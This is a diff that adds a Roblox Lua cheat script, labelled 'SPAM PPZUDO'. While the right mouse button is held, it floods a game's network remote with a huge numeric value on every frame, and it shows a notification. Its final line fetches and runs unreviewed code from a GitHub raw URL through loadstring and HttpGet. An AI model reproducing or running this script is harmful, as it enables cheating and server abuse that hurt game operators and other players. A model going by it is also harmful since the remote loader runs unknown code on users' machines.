@@ -1,0 +1,83 @@
+local MULTIPLIER=1
+local DELAY=0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
+local Players=game:GetService("Players")
+local RunService=game:GetService("RunService")
+local UserInputService=game:GetService("UserInputService")
+local ReplicatedStorage=game:GetService("ReplicatedStorage")
+local TweenService=game:GetService("TweenService")
+local player=Players.LocalPlayer
+while not player do task.wait() player=Players.LocalPlayer end
+local playerGui=player:WaitForChild("PlayerGui")
+local isSpamming=false
+local connection
+local function executeSpam()
+    local args={[1]=2.933813859058389e+76*MULTIPLIER}
+    pcall(function()
+        ReplicatedStorage.TS.GeneratedNetworkRemotes
+        :FindFirstChild("RE_4.6848415795802784e+76")
+        :FireServer(unpack(args))
+    end)
+end
+UserInputService.InputBegan:Connect(function(input,processed)
+    if processed then return end
+    if input.UserInputType==Enum.UserInputType.MouseButton2 then
+        if not isSpamming then
+            isSpamming=true
+            connection=RunService.Heartbeat:Connect(function()
+                executeSpam()
+                task.wait(DELAY)
+            end)
+        end
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType==Enum.UserInputType.MouseButton2 then
+        if connection then
+            connection:Disconnect()
+            connection=nil
+            isSpamming=false
+        end
+    end
+end)
+local notificationGui=Instance.new("ScreenGui")
+notificationGui.Name="NotificationGui"
+notificationGui.ResetOnSpawn=false
+notificationGui.Parent=playerGui
+local notification=Instance.new("Frame")
+notification.Size=UDim2.new(0,300,0,60)
+notification.Position=UDim2.new(0.5,-150,0,-70)
+notification.BackgroundColor3=Color3.fromRGB(40,40,40)
+notification.BorderSizePixel=0
+notification.Parent=notificationGui
+local UICorner=Instance.new("UICorner")
+UICorner.CornerRadius=UDim.new(0,10)
+UICorner.Parent=notification
+local notifText=Instance.new("TextLabel")
+notifText.Size=UDim2.new(1,-20,1,0)
+notifText.Position=UDim2.new(0,10,0,0)
+notifText.BackgroundTransparency=1
+notifText.Text="SPAM PPZUDO – use o botão direito!"
+notifText.TextColor3=Color3.fromRGB(255,255,255)
+notifText.TextScaled=true
+notifText.Font=Enum.Font.Gotham
+notifText.Parent=notification
+local slideIn=TweenService:Create(
+    notification,
+    TweenInfo.new(0.5,Enum.EasingStyle.Back),
+    {Position=UDim2.new(0.5,-150,0,20)}
+)
+local slideOut=TweenService:Create(
+    notification,
+    TweenInfo.new(0.5,Enum.EasingStyle.Back),
+    {Position=UDim2.new(0.5,-150,0,-70)}
+)
+slideIn:Play()
+task.wait(3)
+slideOut:Play()
+slideOut.Completed:Connect(function()
+    notificationGui:Destroy()
+end)
+print("PC Spam loaded successfully!")
+print("Current multiplier: "..MULTIPLIER)
+print("Delay between executions: "..DELAY.." seconds")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Elison999/thunder-hub-phantom-balll/main/thunder%20hub"))()
